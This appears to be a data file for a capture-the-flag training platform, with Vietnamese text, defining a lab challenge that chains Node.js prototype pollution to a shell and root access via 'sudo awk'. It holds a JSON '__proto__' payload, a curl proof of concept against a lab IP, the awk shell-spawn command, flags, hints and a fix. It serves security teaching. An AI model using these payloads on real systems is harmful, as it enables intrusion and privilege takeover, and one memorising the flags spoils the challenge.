import type { ArenaChallenge } from '../../types';

export const challengeProtoPollution: ArenaChallenge = {
  id: '0d-taint-01-proto-pollution',
  title: 'Node.js Prototype Pollution to Linux Capability Root Takeover',
  category: 'zero-day',
  severity: 'critical',
  cvssScore: 9.6,
  bountyReward: 6200,
  xpReward: 1250,
  estimatedMinutes: 20,
  targetHost: '10.0.4.45',
  targetPort: 3000,
  tagline:
    'Khai thác Prototype Pollution trong hàm JSON merge, kích hoạt shell qua child_process và leo quyền Root qua sudo awk.',
  scenarioBriefing:
    'Microservice tài chính sử dụng hàm mergeObject đệ quy thiếu kiểm tra key __proto__. Bằng cách gửi payload JSON ô nhiễm prototype, khi tiến trình con child_process.fork() được kích hoạt, máy chủ mở Reverse Shell cho user operator. Học viên khảo sát sudo -l để khai thác GTFOBins trên lệnh awk và leo quyền lên Root.',
  keyObjectives: [
    'Giai đoạn 1 (Taint Review & Pollution): Đọc mã nguồn trong Patch Diff, gửi payload JSON chứa __proto__.shell qua HTTP Repeater để ô nhiễm runtime.',
    'Giai đoạn 2 (Foothold & User Flag): Nhận Shell session operator, đọc User Flag tại /home/operator/user.txt.',
    'Giai đoạn 3 (Sudo Awk PrivEsc to ROOT): Khảo sát sudo -l phát hiện NOPASSWD /usr/bin/awk, khai thác GTFOBins spawn Root Shell (UID 0) và đọc /root/root.txt.',
  ],
  userFlag: 'OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}',
  rootFlag: 'OS_0DAY{linux_cap_setuid_node_root_pwned}',
  expectedFlag: 'OS_0DAY{linux_cap_setuid_node_root_pwned}',
  hints: [
    {
      level: 0,
      name: 'Source Code Audit in Patch Diff',
      penaltyPercent: 0,
      hintText: 'Mở tab Patch Diff để phân tích hàm mergeObject trong object_utils.js.',
    },
    {
      level: 1,
      name: 'JSON Prototype Pollution Payload',
      penaltyPercent: 10,
      hintText:
        'Gửi POST /api/v1/user/settings với body: {"preferences": {"__proto__": {"shell": "/bin/sh"}}}',
    },
    {
      level: 2,
      name: 'Internal Sudo Enumeration',
      penaltyPercent: 20,
      hintText: 'Chạy "sudo -l" trên terminal để xem binary nào được cấp quyền NOPASSWD.',
    },
    {
      level: 3,
      name: 'Sudo Awk GTFOBins Execution',
      penaltyPercent: 40,
      hintText:
        'Khai thác lệnh awk: sudo awk \'BEGIN {system("/bin/bash")}\' để nâng quyền lên Root.',
    },
  ],
  firstBloodHolder: {
    handle: '@hex_master',
    timeRecord: '06m 40s',
  },
  supportedTools: ['diff', 'repeater', 'terminal'],
  defaultTool: 'diff',
  repeaterConfig: {
    defaultMethod: 'POST',
    defaultUrl: '/api/v1/user/settings',
    defaultRawHeaders:
      'Host: 10.0.4.45:3000\n' +
      'Content-Type: application/json\n' +
      'Accept: application/json\n' +
      'Connection: close',
    defaultBody: '{"preferences": {"theme": "dark", "notifications": true}}',
    targetEndpoint: 'http://10.0.4.45:3000/api/v1/user/settings',
    simulatedResponses: {
      baseResponse: {
        statusCode: 200,
        statusText: 'OK',
        headers: { 'Content-Type': 'application/json' },
        body: '{"status": "updated", "preferences": {"theme": "dark"}}',
      },
      exploitedResponse: {
        statusCode: 200,
        statusText: 'OK (PROTOTYPE POLLUTED)',
        headers: {
          'Content-Type': 'application/json',
          'X-Pollution-Status': 'GLOBAL_PROTOTYPE_CORRUPTED',
        },
        body:
          '{\n' +
          '  "status": "POLLUTED",\n' +
          '  "message": "Object.prototype poisoned successfully",\n' +
          '  "user_flag": "OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}",\n' +
          '  "session_status": "Terminal shell operator@10.0.4.45 available."\n' +
          '}',
        proofFlag: 'OS_0DAY{nodejs_prototype_pollution_rce_gadget_pwned}',
      },
    },
  },
  diffConfig: {
    filename: 'object_utils.js',
    language: 'javascript',
    vulnerableLineStart: 6,
    vulnerableLineEnd: 11,
    rootCauseExplanation:
      'Hàm mergeObject đệ quy gán trực tiếp target[key] = source[key] mà không lọc các thuộc tính nhạy cảm (__proto__, constructor, prototype).',
    taintSink:
      'target[key] = mergeObject(target[key], source[key]); // Prototype Pollution sink',
    vulnerableCode:
      '// vulnerable_merge.js\n' +
      'function mergeObject(target, source) {\n' +
      '    for (let key in source) {\n' +
      '        if (typeof source[key] === "object" && source[key] !== null) {\n' +
      '            if (!target[key]) target[key] = {};\n' +
      '            mergeObject(target[key], source[key]); // LỖ HỔNG: Gán thẳng __proto__!\n' +
      '        } else {\n' +
      '            target[key] = source[key];\n' +
      '        }\n' +
      '    }\n' +
      '    return target;\n' +
      '}',
    patchedCode:
      '// patched_merge.js (Safe Implementation)\n' +
      'const BLACKLISTED_KEYS = new Set(["__proto__", "constructor", "prototype"]);\n' +
      'function mergeObjectSafe(target, source) {\n' +
      '    for (let key in source) {\n' +
      '        if (BLACKLISTED_KEYS.has(key)) continue;\n' +
      '        if (Object.prototype.hasOwnProperty.call(source, key)) {\n' +
      '            if (typeof source[key] === "object" && source[key] !== null) {\n' +
      '                if (!target[key]) target[key] = {};\n' +
      '                mergeObjectSafe(target[key], source[key]);\n' +
      '            } else {\n' +
      '                target[key] = source[key];\n' +
      '            }\n' +
      '        }\n' +
      '    }\n' +
      '    return target;\n' +
      '}',
  },
  terminalConfig: {
    hostname: 'kali-operator',
    ip: '10.0.4.15',
    user: 'operator',
    initialDirectory: '/home/operator',
    sampleCommands: ['sudo -l', 'sudo awk \'BEGIN {system("/bin/bash")}\''],
    bannerText:
      '[*] Node.js Zero-Day Security Lab Ready\n' +
      '[*] Target Service: 10.0.4.45:3000\n',
  },
  writeup: {
    title: 'Node.js Prototype Pollution to Sudo Awk Root Walkthrough',
    cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H',
    vulnerabilityOverview:
      'Lỗ hổng Prototype Pollution cho phép kẻ tấn công sửa đổi Object.prototype trong JavaScript runtime, làm ô nhiễm các tùy chọn spawn của child_process để lấy shell operator, sau đó leo quyền lên Root qua sudo awk.',
    rootCauseAnalysis:
      '1. Hàm mergeObject không chặn thuộc tính __proto__.\n2. Cấu hình sudoers cho phép user operator thực thi awk không cần mật khẩu.',
    exploitChainWalkthrough: [
      'Bước 1: Gửi JSON chứa __proto__.shell vào /api/v1/user/settings.',
      'Bước 2: Bắt shell operator và đọc User Flag tại /home/operator/user.txt.',
      'Bước 3: Chạy sudo -l và thực thi GTFOBins "sudo awk \'BEGIN {system(\"/bin/bash\")}\'" để lấy Root Flag tại /root/root.txt.',
    ],
    weaponizedPoC:
      'curl -X POST http://10.0.4.45:3000/api/v1/user/settings \\\n  -H "Content-Type: application/json" \\\n  -d \'{"preferences":{"__proto__":{"shell":"/bin/sh"}}}\'',
    remediationSnippet:
      '// Đóng băng prototype hoặc dùng Map thay cho plain object:\nObject.freeze(Object.prototype);',
  },
};
